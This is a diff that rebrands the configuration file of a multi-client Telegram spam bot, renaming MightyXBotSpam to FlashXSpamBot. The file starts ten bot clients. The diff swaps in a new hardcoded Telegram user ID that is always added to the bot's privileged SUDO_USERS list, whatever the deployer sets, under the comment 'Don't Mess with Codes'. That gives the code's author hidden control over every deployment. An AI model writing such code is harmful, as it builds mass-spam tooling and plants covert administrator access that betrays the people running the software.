@@ -1,5 +1,5 @@
-# MightyXBotSpam || @MightyXSupport
-# Copyright © 2021 @RiZoeLX
+# FlashXSpamBot || @Flash_Support_Group
+# Copyright © 2021 @Flash_Support_Group
 
 import os
 import sys
@@ -18,7 +18,7 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-mightyversion = "v2.0.3"
+flashversion = "v2.0.3"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
@@ -38,35 +38,35 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5120313803 not in SUDO_USERS:
+    SUDO_USERS.append(5120313803)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(5120313803)
 
 # Tokens
 
-Mig = TelegramClient('Mig', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+Fla = TelegramClient('Fla', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-Mig2 = TelegramClient('Mig2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
+Fla2 = TelegramClient('Fla2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
-Mig3 = TelegramClient('Mig3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
+FLa3 = TelegramClient('Fla3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
 
-Mig4 = TelegramClient('Mig4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
+Fla4 = TelegramClient('Fla4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
 
-Mig5 = TelegramClient('Mig5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
+Fla5 = TelegramClient('Fla5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
 
-Mig6 = TelegramClient('Mig6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
+Fla6 = TelegramClient('Fla6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
 
-Mig7 = TelegramClient('Mig7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
+Fla7 = TelegramClient('Fla7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
 
-Mig8 = TelegramClient('Mig8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
+Fla8 = TelegramClient('Fla8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
 
-Mig9 = TelegramClient('Mig9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
+Fla9 = TelegramClient('Fla9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
-Mig10 = TelegramClient('Mig10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+Fla10 = TelegramClient('Fla10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
